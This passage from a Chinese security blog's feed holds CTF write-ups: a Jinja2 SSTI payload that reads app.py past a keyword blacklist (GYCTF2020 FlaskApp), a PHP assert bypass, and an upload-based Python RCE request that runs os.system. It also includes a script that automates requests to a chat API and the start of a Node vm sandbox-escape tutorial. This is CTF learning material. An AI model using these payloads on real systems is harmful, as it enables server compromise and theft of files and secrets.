class="string">&quot;authorization,content-type&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://ai.xiabb.chat/&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;https://ai.xiabb.chat&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="string">&quot;empty&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="string">&quot;cors&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Sec-Fetch-Site&quot;</span>: <span class="string">&quot;same-site&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Te&quot;</span>: <span class="string">&quot;trailers&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        opts_res = requests.options(url=url,headers=opts_headers)</span><br><span class="line">        msg_res = requests.post(url,headers=headers)</span><br><span class="line">        <span class="built_in">print</span>(msg_res.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;something error in sending messge&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">newTopic</span>():</span><br><span class="line">    url = <span class="string">&quot;https://api.xiabb.chat/chatapi/chat/save&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>: host,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: UA,</span><br><span class="line">        <span class="string">&quot;Authorization&quot;</span>: Authorization,</span><br><span class="line">        <span class="string">&quot;Language&quot;</span>: <span class="string">&quot;zh-CN&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;https://ai.xiabb.chat&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://ai.xiabb.chat/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="string">&quot;empty&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="string">&quot;cors&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Sec-Fetch-Site&quot;</span>: <span class="string">&quot;same-site&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Te&quot;</span>: <span class="string">&quot;trailers&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;roleId&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;title&quot;</span>:<span class="string">&quot;你好&quot;</span>,</span><br><span class="line">        <span class="string">&quot;isLock&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;systemMessage&quot;</span>:<span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;params&quot;</span>:<span class="string">&quot;&#123;\&quot;model\&quot;:\&quot;gpt-3.5-turbo-16k-0613\&quot;,\&quot;is_webSearch\&quot;:false,\&quot;message\&quot;:[],\&quot;systemMessage\&quot;:null,\&quot;requestMsgCount\&quot;:6,\&quot;temperature\&quot;:0.8,\&quot;max_tokens\&quot;:8192&#125;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(headers=headers,url=url,json=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        json_res = res.json()</span><br><span class="line">        result = json_res.get(<span class="string">&quot;result&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;it works!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> topicId:</span><br><span class="line">    topicId = newTopic()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;topicId:&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(topicId)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;topicId exist&quot;</span>)</span><br><span class="line">sendMessage()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GYCTF2020 FlaskApp</title>
      <link href="/2024/01/28/GYCTF2020-FlaskApp/"/>
      <url>/2024/01/28/GYCTF2020-FlaskApp/</url>
      
        <content type="html"><![CDATA[<h1 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h1><p>在解密的页面输入任意几个字母(非base64码),会发现报错,泄露部分源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line"></span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line"></span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line"></span><br><span class="line">        tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line"></span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">res =  render_template_string(tmp)</span><br></pre></td></tr></table></figure><p>可以看见tmp里将用户输入的内容base64解码后直接嵌入了进去</p><p>有理由怀疑ssti</p><p>尝试一下</p><p>我们输入<code>e3sxMTExfX0=</code>(也就是1111编码后的结果)</p><p>会返回一个<code>1111</code>,果然是ssti</p><p>这里浅尝试了一下,发现不能直接回显出来_<em>subclass</em>_()的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(&#x27;&#x27;.__class__.__base__.__subclasses__())%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for i in &#x27;&#x27;.__class__.__bases__[0].__subclasses__() %&#125;&#123;% print(i) %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>这两条都是没有回显的</p><p>看大佬的做法是嵌套一层if来找到catch_warnings,然后构造读取app.py</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;, &#x27;r&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure><p>读到的代码手动fomat一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template_string </span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template,request,flash,redirect,url_for </span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm </span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField </span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired </span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap </span><br><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line">app = Flask(__name__) </span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;s_e_c_r_e_t_k_e_y&#x27;</span> </span><br><span class="line">bootstrap = Bootstrap(app) </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NameForm</span>(<span class="title class_ inherited__">FlaskForm</span>): </span><br><span class="line">    text = StringField(<span class="string">&#x27;BASE64 Æ&#x27;</span>,validators= [DataRequired()]) </span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;Ð¤&#x27;</span>) </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NameForm1</span>(<span class="title class_ inherited__">FlaskForm</span>): </span><br><span class="line">    text = StringField(<span class="string">&#x27;BASE64ãÆ&#x27;</span>,validators= [DataRequired()]) </span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;Ð¤&#x27;</span>) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params"><span class="built_in">str</span></span>): </span><br><span class="line">    black_list = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;os&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;import&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;chr&quot;</span>,<span class="string">&quot;request&quot;</span>, <span class="string">&quot;subprocess&quot;</span>,<span class="string">&quot;commands&quot;</span>,<span class="string">&quot;socket&quot;</span>,<span class="string">&quot;hex&quot;</span>,<span class="string">&quot;base64&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>] </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list : </span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>.lower() : </span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hint&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>(): </span><br><span class="line">    txt = <span class="string">&quot;1%CKÍ&quot;</span> </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;hint.html&quot;</span>,txt = txt) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(): </span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) : </span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>) </span><br><span class="line">        text_decode = base64.b64encode(text.encode()) </span><br><span class="line">        tmp = <span class="string">&quot;Ó :&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(text_decode.decode())) </span><br><span class="line">        res = render_template_string(tmp) </span><br><span class="line">        flash(tmp) </span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;encode&#x27;</span>)) </span><br><span class="line">    <span class="keyword">else</span> : </span><br><span class="line">        text = <span class="string">&quot;&quot;</span> </span><br><span class="line">        form = NameForm(text)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,form = form ,method = <span class="string">&quot; Æ&quot;</span> ,img = <span class="string">&quot;flask.png&quot;</span>) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(): </span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) : </span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>) </span><br><span class="line">        text_decode = base64.b64decode(text.encode()) </span><br><span class="line">        tmp = <span class="string">&quot;Ó  &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode()) </span><br><span class="line">        <span class="keyword">if</span> waf(tmp) : </span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>) </span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>)) </span><br><span class="line">        res = render_template_string(tmp) </span><br><span class="line">        flash( res ) </span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>)) </span><br><span class="line">    <span class="keyword">else</span> : </span><br><span class="line">        text = <span class="string">&quot;&quot;</span> </span><br><span class="line">        form = NameForm1(text) </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,form = form, method = <span class="string">&quot;ãÆ&quot;</span> , img = <span class="string">&quot;flask1.png&quot;</span>) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;name&gt;&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">not_found</span>(<span class="params">name</span>): </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;404.html&quot;</span>,name = name) </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>) </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>禁了一些常用的词</p>]]></content>
      
      
      <categories>
          
          <category> buu刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssti </tag>
            
            <tag> Flask审计 </tag>
            
            <tag> jinja2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nssctf-#round-17-basic-web</title>
      <link href="/2024/01/28/nssctf-round-17-basic-web/"/>
      <url>/2024/01/28/nssctf-round-17-basic-web/</url>
      
        <content type="html"><![CDATA[<h1 id="NSSCTF-Round-17-Basic-Web"><a href="#NSSCTF-Round-17-Basic-Web" class="headerlink" title="NSSCTF Round#17 Basic Web"></a>NSSCTF Round#17 Basic Web</h1><h2 id="真·签到"><a href="#真·签到" class="headerlink" title="真·签到"></a>真·签到</h2><p>一点进去就看见网页标题robots?</p><p>看下robots.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hint:E794A8E688B7E5908DE7869FE68289E590972CE696B0E7949FE8B59BE58FAFE98187E8A781E8BF87E593A67E0AE8AEB0E5BE97E794A8E688B7E5908DE585A8E794A8E5B08FE58699E593A6EFBD9EEFBD9E</span><br><span class="line">username:13 44 21 15 42</span><br><span class="line">password:LF5GY3KZKRVTCT2EM54FUV2FO5GVIVLZJZ5GW6C2IRJGQTT2KU2VUR2GNJNEIYZVLJDVKPI=</span><br></pre></td></tr></table></figure><p>这里的hint不难发现只有16进制的字母,16进制解一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名熟悉吗,新生赛可遇见过哦~</span><br><span class="line">记得用户名全用小写哦～～</span><br></pre></td></tr></table></figure><p>确实是没什么用</p><p>password应该是base编码</p><p>用一次base32＋一次base64解得</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c9fa95881ea0152791d4a759dacd79de</span><br></pre></td></tr></table></figure><p>再用在线的MD5解密工具解得密码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nss</span><br></pre></td></tr></table></figure><p>MD5解密网站:<a href="https://www.somd5.com/">https://www.somd5.com/</a></p><p>至于username,求助某密码手tldys得知是棋盘密码</p><p>解得</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfer</span><br></pre></td></tr></table></figure><p>登录成功后查看网页源代码,按照hint访问&#x2F;F111n4l.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nss&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;nss&#x27;</span>] == <span class="number">732339662</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(<span class="string">&quot;is_numeric(<span class="subst">$_GET</span>[nss])==0&quot;</span>) || <span class="keyword">die</span>(<span class="string">&#x27;oops!此路不通！！&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;这里不是说了吗！！！必须是 732339662 (招新群群号！)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;啊？这是什么新型比较？&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;是不是题错了啊&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个php比较在网上也是可以直接查到解法</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?nss=732339662,1</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240128155341527.png" alt="image-20240128155341527"></p><p>拿到flag</p><h2 id="真的是文件上传吗？"><a href="#真的是文件上传吗？" class="headerlink" title="真的是文件上传吗？"></a>真的是文件上传吗？</h2><p>一进去就看见fuck编码</p><p>解码结果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BrainFuck解码:You want a hint?</span><br><span class="line">Give me a flag!!!!</span><br><span class="line">And you will hava hint!**************</span><br></pre></td></tr></table></figure><p>经典的give me a flag</p><p>get传参一个flag</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240128155903200.png" alt="image-20240128155903200"></p><p>这里差点以为是ssti了,幸亏没有钻牛角尖,试了一手就没管了</p><p>源码里面有东西,但是好像没什么用</p><p>还是看upload的地方</p><p>随便传一张图片,发现居然会报错</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Werkzeug/2.2.2 Python/3.8.15</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 28 Jan 2024 08:01:19 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>265</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-xml">阿对对对传对了 那路径在哪里呢？!<span class="comment">&lt;!--   File &quot;upload/35341583_p0.jpg&quot;, line 1</span></span></span><br><span class="line"><span class="comment"><span class="language-xml">SyntaxError: Non-UTF-8 code starting with &#x27;\xff&#x27; in file upload/35341583_p0.jpg on line 1, but no encoding declared; see http://python.org/dev/peps/pep-0263/ for details --&gt;</span></span></span><br></pre></td></tr></table></figure><p>查了下这个pep</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240128160326244.png" alt="image-20240128160326244"></p><p>似乎是语法规范,或许这里直接执行了python代码?</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240128160521433.png" alt="image-20240128160521433"></p><p>确实是啊</p><p>那就可以直接rce</p><p>通过查看app.py的内容,发现flag在环境变量里</p><p>最终poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node1.anna.nssctf.cn:28886</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------251223018415561458614127786332</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>250</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://node1.anna.nssctf.cn:28886</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://node1.anna.nssctf.cn:28886/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------251223018415561458614127786332</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;3.png&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: image/png</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">import</span> os</span></span><br><span class="line"><span class="language-pgsql">os.<span class="keyword">system</span>(<span class="string">&#x27;echo $FLAG&#x27;</span>)</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------251223018415561458614127786332--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Werkzeug/2.2.2 Python/3.8.15</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 28 Jan 2024 08:07:44 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>100</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-dust"><span class="language-xml">阿对对对传对了 那路径在哪里呢？!<span class="comment">&lt;!-- NSSCTF</span></span><span class="template-variable">&#123;b86f6f24-8687-43ec-95b2-7bd2504b711b&#125;</span><span class="language-xml"><span class="comment"> --&gt;</span></span></span></span><br></pre></td></tr></table></figure><p>得到flag</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>初步认识NodeJs VM和VM2沙箱逃逸</title>
      <link href="/2024/01/24/%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86NodeJs-VM%E5%92%8CVM2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>/2024/01/24/%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86NodeJs-VM%E5%92%8CVM2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h1><h2 id="常用的vm模块的API"><a href="#常用的vm模块的API" class="headerlink" title="常用的vm模块的API"></a>常用的vm模块的API</h2><h4 id="vm-runinThisContext-code"><a href="#vm-runinThisContext-code" class="headerlink" title="vm.runinThisContext(code)"></a>vm.runinThisContext(code)</h4><blockquote><p>在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。sandbox中可以访问到global中的属性，但无法访问其他包中的属性。</p></blockquote><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/20221118183902-378e6dda-672d-1.png"></p><p>示例:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> localVar = <span class="string">&#x27;initial value&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> vmResult = vm.<span class="title function_">runInThisContext</span>(<span class="string">&#x27;localVar = &quot;vm&quot;;&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;vmResult:&#x27;</span>, vmResult);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;localVar:&#x27;</span>, localVar); </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vmResult: vm</span><br><span class="line">localVar: initial value</span><br></pre></td></tr></table></figure><h4 